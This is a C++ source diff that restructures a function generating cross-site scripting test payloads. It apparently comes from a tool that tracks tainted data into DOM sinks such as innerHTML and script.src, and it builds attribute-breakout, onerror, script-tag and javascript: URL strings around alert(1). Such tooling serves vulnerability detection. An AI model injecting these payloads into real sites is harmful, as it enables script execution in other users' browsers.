@@ -354,46 +354,48 @@ std::string Metadata::generate_exploit_from_scratch() const {
         // // Exploit.tag: script
     std::string payload = "";
     std::string function = "alert(1)";
-    if (is_initialized() && has_valid_exploit()) {
-        if (get_exploit_type() == Exploit_Type::Html) {
-            if (get_exploit_token() == "attribute") {
-                // Need to break out of attribute
-                payload += get_exploit_quote_type();
-                payload += ">";
+    if (is_initialized()) {
+        if (has_valid_exploit()) {
+            if (get_exploit_type() == Exploit_Type::Html) {
+                if (get_exploit_token() == "attribute") {
+                    // Need to break out of attribute
+                    payload += get_exploit_quote_type();
+                    payload += ">";
+                }
+                // Now break out of non-executing contexts
+                //payload += "</iframe></style></script></object></embed></textarea>";
+                payload += "</iframe></script>";
+                // Add execution tags
+                if ((get_sink() == "innerHTML") ||
+                    (get_sink() == "outerHTML") ||
+                    (get_sink() == "insertAdjacentHTML")) {
+                    payload += "<img src=x onerror=";
+                } else {
+                    payload += "<script>";
+                }
+                payload += function;
+                if ((get_sink() == "innerHTML") ||
+                    (get_sink() == "outerHTML") ||
+                    (get_sink() == "insertAdjacentHTML")) {
+                    payload += "><!--/*";
+                } else {
+                    payload += "</script><!--/*";
+                }
             }
-            // Now break out of non-executing contexts
-            //payload += "</iframe></style></script></object></embed></textarea>";
-            payload += "</iframe></script>";
-            // Add execution tags
-            if ((get_sink() == "innerHTML") ||
-                (get_sink() == "outerHTML") ||
-                (get_sink() == "insertAdjacentHTML")) {
-                payload += "<img src=x onerror=";
-            } else {
-                payload += "<script>";
+        } else if ((get_sink() == "track.src")  ||
+                   (get_sink() == "script.src") ||
+                   (get_sink() == "object.data")||
+                   (get_sink() == "media.src")  ||
+                   (get_sink() == "embed.src")  ||
+                   (get_sink() == "img.src")    ||
+                   (get_sink() == "imgset.src") ||
+                   (get_sink() == "iframe.src")) {
+            // See if we can generate a URL payload
+            if (get_start_index() == 0) { // Can only exploit if we control the start of the string
+                payload += "javascript:";
+                payload += function;
+                payload += "//";
             }
-            payload += function;
-            if ((get_sink() == "innerHTML") ||
-                (get_sink() == "outerHTML") ||
-                (get_sink() == "insertAdjacentHTML")) {
-                payload += "><!--/*";
-            } else {
-                payload += "</script><!--/*";
-            }
-        }
-    } else if ((get_sink() == "track.src")  ||
-               (get_sink() == "script.src") ||
-               (get_sink() == "object.data")||
-               (get_sink() == "media.src")  ||
-               (get_sink() == "embed.src")  ||
-               (get_sink() == "img.src")    ||
-               (get_sink() == "imgset.src") ||
-               (get_sink() == "iframe.src")) {
-        // See if we can generate a URL payload
-        if (get_start_index() == 0) { // Can only exploit if we control the start of the string
-            payload += "javascript:";
-            payload += function;
-            payload += "//";
         }
     }
     return payload;
